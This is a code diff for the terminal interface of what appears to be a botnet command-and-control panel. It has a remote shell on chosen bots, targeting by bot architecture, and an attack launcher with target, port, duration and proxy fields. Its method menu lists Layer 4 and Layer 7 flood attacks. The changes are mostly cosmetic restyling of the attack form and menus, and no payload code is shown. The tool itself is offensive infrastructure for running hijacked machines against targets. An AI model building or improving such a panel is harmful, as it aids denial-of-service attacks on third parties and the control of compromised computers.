@@ -267,13 +267,13 @@ type TUIModel struct {
 	launchAnimDur    string    // duration
 
 	// Remote shell
-	selectedBot        string // Bot ID for remote shell
-	selectedBotArch    string
-	shellInput         string
-	shellOutput        []string // Output lines
-	shellHistory       []string // Command history
-	historyCursor      int
-	shellScrollOffset  int // Lines scrolled up from bottom (0 = latest)
+	selectedBot       string // Bot ID for remote shell
+	selectedBotArch   string
+	shellInput        string
+	shellOutput       []string // Output lines
+	shellHistory      []string // Command history
+	historyCursor     int
+	shellScrollOffset int // Lines scrolled up from bottom (0 = latest)
 
 	// Broadcast targeting
 	broadcastArch    string // Filter by architecture (empty = all)
@@ -283,8 +283,8 @@ type TUIModel struct {
 	shortcutCursor   int    // Cursor position in shortcuts/linux lists
 
 	// Remote shell tabs (Shell / Linux helpers)
-	remoteShellTab     int // 0 = Shell, 1 = Linux helpers
-	remoteShortcutCur  int // Cursor in linux helpers list
+	remoteShellTab    int // 0 = Shell, 1 = Linux helpers
+	remoteShortcutCur int // Cursor in linux helpers list
 
 	// Confirmation prompts
 	confirmKill         bool   // Waiting for kill confirmation
@@ -1459,7 +1459,7 @@ func (m TUIModel) viewDashboard() string {
 		"                                                                                             **",
 		"",
 		"   ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─",
-		"       ☾℣☽   C O M M A N D   &   C O N T R O L",
+		"       								☾℣☽ C O M M A N D   &   C O N T R O L ☾℣☽",
 		"   ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─",
 		"",
 	}
@@ -1512,9 +1512,9 @@ func (m TUIModel) viewDashboard() string {
 	accent := lipgloss.NewStyle().Foreground(lipgloss.Color("105"))
 
 	menuWidth := 48
-	b.WriteString(accent.Render("    ┌" + strings.Repeat("─", menuWidth) + "┐") + "\n")
+	b.WriteString(accent.Render("    ┌"+strings.Repeat("─", menuWidth)+"┐") + "\n")
 	b.WriteString(accent.Render("    │") + neonPink.Bold(true).Render(centerText("N A V I G A T I O N", menuWidth)) + accent.Render("│") + "\n")
-	b.WriteString(accent.Render("    ├" + strings.Repeat("─", menuWidth) + "┤") + "\n")
+	b.WriteString(accent.Render("    ├"+strings.Repeat("─", menuWidth)+"┤") + "\n")
 
 	menuIcons := []string{"◆", "◆", "◆", "◆", "◇", "·"}
 	for i, item := range m.menuItems {
@@ -1534,9 +1534,9 @@ func (m TUIModel) viewDashboard() string {
 		}
 	}
 
-	b.WriteString(accent.Render("    ├" + strings.Repeat("─", menuWidth) + "┤") + "\n")
+	b.WriteString(accent.Render("    ├"+strings.Repeat("─", menuWidth)+"┤") + "\n")
 	b.WriteString(accent.Render("    │") + dim.Render(centerText("↑↓  navigate    ↵  select    q  quit", menuWidth)) + accent.Render("│") + "\n")
-	b.WriteString(accent.Render("    └" + strings.Repeat("─", menuWidth) + "┘") + "\n")
+	b.WriteString(accent.Render("    └"+strings.Repeat("─", menuWidth)+"┘") + "\n")
 
 	return b.String()
 }
@@ -1737,7 +1737,7 @@ func (m TUIModel) viewAttack() string {
 			borderColor = animGreen
 		}
 
-		b.WriteString(borderColor.Render("    ┌" + strings.Repeat("─", width) + "┐") + "\n")
+		b.WriteString(borderColor.Render("    ┌"+strings.Repeat("─", width)+"┐") + "\n")
 
 		// Title
 		if m.launchAnimStage >= 5 {
@@ -1750,7 +1750,7 @@ func (m TUIModel) viewAttack() string {
 			b.WriteString(borderColor.Render("    │") + strings.Repeat(" ", titlePad) + animPurple.Bold(true).Render(title) + strings.Repeat(" ", width-titlePad-len(title)) + borderColor.Render("│") + "\n")
 		}
 
-		b.WriteString(borderColor.Render("    ├" + strings.Repeat("─", width) + "┤") + "\n")
+		b.WriteString(borderColor.Render("    ├"+strings.Repeat("─", width)+"┤") + "\n")
 
 		// Status
 		b.WriteString(borderColor.Render("    │"))
@@ -1777,7 +1777,7 @@ func (m TUIModel) viewAttack() string {
 		b.WriteString(animDim.Render(fmt.Sprintf(" %3d%%", pct)) + " ")
 		b.WriteString(borderColor.Render("│") + "\n")
 
-		b.WriteString(borderColor.Render("    ├" + strings.Repeat("─", width) + "┤") + "\n")
+		b.WriteString(borderColor.Render("    ├"+strings.Repeat("─", width)+"┤") + "\n")
 
 		// Target info
 		info := fmt.Sprintf("  %s  ·  %s  ·  %s",
@@ -1790,7 +1790,7 @@ func (m TUIModel) viewAttack() string {
 			infoPad = 0
 		}
 		b.WriteString(borderColor.Render("    │") + animDim.Render(info) + strings.Repeat(" ", infoPad) + borderColor.Render("│") + "\n")
-		b.WriteString(borderColor.Render("    └" + strings.Repeat("─", width) + "┘") + "\n")
+		b.WriteString(borderColor.Render("    └"+strings.Repeat("─", width)+"┘") + "\n")
 
 		return b.String()
 	}
@@ -1935,76 +1935,126 @@ func (m TUIModel) viewAttack() string {
 			}{"◇", "PROXY URL", m.attackProxyURL, proxyHint})
 		}
 
-		// Suave form — clean lines, elegant spacing
-		formAccent := lipgloss.NewStyle().Foreground(lipgloss.Color("105"))
-		b.WriteString(formAccent.Render("    ┌─────────────────────────────────────────────────────┐") + "\n")
-		b.WriteString(formAccent.Render("    │") + lipgloss.NewStyle().Foreground(lipgloss.Color("135")).Bold(true).Render("         C O N F I G U R E   P A R A M E T E R S       ") + formAccent.Render("│") + "\n")
-		b.WriteString(formAccent.Render("    ├─────────────────────────────────────────────────────┤") + "\n")
+		// Premium parameter form — double-line bordered box
+		boxW := 63
+		fb := lipgloss.NewStyle().Foreground(lipgloss.Color("99"))
+		ft := lipgloss.NewStyle().Foreground(lipgloss.Color("141")).Bold(true)
+		fHint := lipgloss.NewStyle().Foreground(lipgloss.Color("243")).Italic(true)
+		fLine := lipgloss.NewStyle().Foreground(lipgloss.Color("105"))
+
+		// Helper: bordered box line with auto-padding to boxW visible chars
+		bxLine := func(content string, vLen int) string {
+			pad := boxW - vLen
+			if pad < 0 {
+				pad = 0
+			}
+			return fb.Render("    ║") + content + strings.Repeat(" ", pad) + fb.Render("║") + "\n"
+		}
+
+		// Top border
+		b.WriteString(fb.Render("    ╔"+strings.Repeat("═", boxW)+"╗") + "\n")
+		b.WriteString(bxLine("", 0))
+
+		// Title with node count
+		titleText := "C O N F I G U R E   P A R A M E T E R S"
+		nodeLabel := fmt.Sprintf("%d nodes", m.botCount)
+		titleGap := boxW - 7 - len(titleText) - len(nodeLabel)
+		if titleGap < 1 {
+			titleGap = 1
+		}
+		titleContent := "   " + ft.Render(titleText) + strings.Repeat(" ", titleGap) + neonGreen.Render("●") + " " + dim.Render(nodeLabel) + "  "
+		b.WriteString(bxLine(titleContent, boxW))
+
+		b.WriteString(bxLine("", 0))
+		b.WriteString(fb.Render("    ╠"+strings.Repeat("═", boxW)+"╣") + "\n")
+		b.WriteString(bxLine("", 0))
 
 		for i, field := range fields {
 			isSelected := i == m.attackCursor
 			isEditing := m.attackInputActive && isSelected
 
-			b.WriteString(formAccent.Render("    │ "))
+			// Build field row
+			var rc strings.Builder
+			vLen := 0
 
-			// Cursor indicator
+			// Cursor indicator (4 visible chars)
 			if isSelected {
-				b.WriteString(neonCyan.Bold(true).Render(" ▸ "))
+				rc.WriteString(neonCyan.Bold(true).Render("  ▸ "))
 			} else {
-				b.WriteString(dim.Render("   "))
+				rc.WriteString("    ")
 			}
+			vLen += 4
 
-			// Label
+			// Label (10 visible chars, padded)
 			labelStyle := dim
 			if isSelected {
 				labelStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("195")).Bold(true)
 			}
-			b.WriteString(labelStyle.Render(fmt.Sprintf("%-10s", field.label)))
-			b.WriteString(dim.Render("  "))
+			rc.WriteString(labelStyle.Render(fmt.Sprintf("%-10s", field.label)))
+			vLen += 10
 
-			// Value
-			displayValue := field.value
-			if displayValue == "" {
-				displayValue = "· · · · · · · ·"
+			// Vertical separator (5 visible chars)
+			if isSelected {
+				rc.WriteString(fLine.Render("  │  "))
+			} else {
+				rc.WriteString(dim.Render("  │  "))
 			}
-			if displayValue == "[ SELECT ]" {
+			vLen += 5
+
+			// Value display
+			valVLen := 0
+			if field.value == "[ SELECT ]" {
 				if isSelected {
-					b.WriteString(neonYellow.Bold(true).Render(displayValue))
+					rc.WriteString(neonYellow.Bold(true).Render("[ SELECT ]"))
 				} else {
-					b.WriteString(dim.Italic(true).Render(displayValue))
+					rc.WriteString(dim.Italic(true).Render("[ SELECT ]"))
+				}
+				valVLen = 10
+			} else if field.value == "" && !isEditing {
+				if isSelected {
+					rc.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("60")).Render(strings.Repeat("_", 24)))
+					valVLen = 24
+				} else {
+					rc.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("238")).Render("· · · · · · · ·"))
+					valVLen = 15
 				}
 			} else if isEditing {
-				b.WriteString(neonGreen.Bold(true).Render(field.value))
-				b.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("195")).Render("▎"))
+				rc.WriteString(neonGreen.Bold(true).Render(field.value))
+				rc.WriteString(lipgloss.NewStyle().Foreground(lipgloss.Color("195")).Render("▎"))
+				valVLen = len(field.value) + 1
 			} else if isSelected {
-				b.WriteString(neonCyan.Bold(true).Render(displayValue))
+				rc.WriteString(neonCyan.Bold(true).Render(field.value))
+				valVLen = len(field.value)
 			} else {
-				b.WriteString(white.Render(displayValue))
+				rc.WriteString(white.Render(field.value))
+				valVLen = len(field.value)
 			}
+			vLen += valVLen
 
-			// Padding and hint
-			valueLen := len(displayValue)
-			if isEditing {
-				valueLen++
-			}
-			padding := 23 - valueLen
-			if padding < 0 {
-				padding = 0
-			}
-			b.WriteString(strings.Repeat(" ", padding))
+			// Right margin
+			rc.WriteString("  ")
+			vLen += 2
 
+			b.WriteString(bxLine(rc.String(), vLen))
+
+			// Hint row for selected field (full text, not truncated)
 			if isSelected && !isEditing {
-				b.WriteString(dim.Italic(true).Render(truncate(field.hint, 17)))
-			} else {
-				b.WriteString(strings.Repeat(" ", 17))
+				hintPad := 19 // aligns with value column (4+10+5)
+				hContent := strings.Repeat(" ", hintPad) + fHint.Render(field.hint) + "  "
+				b.WriteString(bxLine(hContent, hintPad+len(field.hint)+2))
 			}
 
-			b.WriteString(formAccent.Render(" │") + "\n")
+			// Accent underline while editing
+			if isEditing {
+				ePad := 19
+				eContent := strings.Repeat(" ", ePad) + fLine.Render(strings.Repeat("━", 28)) + "  "
+				b.WriteString(bxLine(eContent, ePad+28+2))
+			}
 		}
 
-		b.WriteString(formAccent.Render("    └─────────────────────────────────────────────────────┘") + "\n")
+		b.WriteString(bxLine("", 0))
 
-		// Command preview — minimal style
+		// Command preview integrated in box footer
 		if m.attackMethod != "" && m.attackTarget != "" {
 			port := m.attackPort
 			if port == "" {
@@ -2020,16 +2070,26 @@ func (m TUIModel) viewAttack() string {
 			} else {
 				cmdPreview = fmt.Sprintf("%s %s %s %s", m.attackCmd, m.attackTarget, port, dur)
 			}
-			b.WriteString("\n")
-			b.WriteString(dim.Render("    ") + lipgloss.NewStyle().Foreground(lipgloss.Color("105")).Render("PREVIEW") + dim.Render("  ") + neonGreen.Render("$ "+cmdPreview) + "\n")
+			cmdStr := "$ " + cmdPreview
+			maxCmdLen := boxW - 16
+			if len(cmdStr) > maxCmdLen {
+				cmdStr = cmdStr[:maxCmdLen-3] + "..."
+			}
+			b.WriteString(fb.Render("    ╠"+strings.Repeat("─", boxW)+"╣") + "\n")
+			pContent := "   " + fLine.Render("COMMAND") + "  " + neonGreen.Render(cmdStr) + "  "
+			pVLen := 3 + 7 + 2 + len(cmdStr) + 2
+			b.WriteString(bxLine(pContent, pVLen))
 		}
+
+		// Bottom border
+		b.WriteString(fb.Render("    ╚"+strings.Repeat("═", boxW)+"╝") + "\n")
 
 		if m.errorMessage != "" {
 			b.WriteString("\n")
 			b.WriteString(neonRed.Bold(true).Render("    ⚠  "+m.errorMessage) + "\n")
 		}
 
-		// Controls — suave footer
+		// Controls footer
 		b.WriteString("\n")
 		if m.attackInputActive {
 			b.WriteString(dim.Render("    ") + neonCyan.Render("typing") + dim.Render("  ·  ") + dim.Render("↵ confirm  ·  esc cancel") + "\n")
@@ -2168,18 +2228,18 @@ func (m TUIModel) viewMethodSelect() string {
 
 	// Layer 4 attacks
 	b.WriteString(mAccent.Render("   LAYER 4") + mDim.Render("  network") + "\n")
-	b.WriteString(mDim.Render("   " + strings.Repeat("─", 50)) + "\n")
+	b.WriteString(mDim.Render("   "+strings.Repeat("─", 50)) + "\n")
 
 	for i, method := range attackMethods {
 		if i == 8 { // After L4 methods, show L7 header
 			b.WriteString("\n")
 			b.WriteString(mAccent.Render("   LAYER 7") + mDim.Render("  application") + "\n")
-			b.WriteString(mDim.Render("   " + strings.Repeat("─", 50)) + "\n")
+			b.WriteString(mDim.Render("   "+strings.Repeat("─", 50)) + "\n")
 		}
 		if i == 2 { // HTTP methods are L7
 			b.WriteString("\n")
 			b.WriteString(mAccent.Render("   LAYER 7") + mDim.Render("  application") + "\n")
-			b.WriteString(mDim.Render("   " + strings.Repeat("─", 50)) + "\n")
+			b.WriteString(mDim.Render("   "+strings.Repeat("─", 50)) + "\n")
 		}
 
 		if i == m.methodCursor {
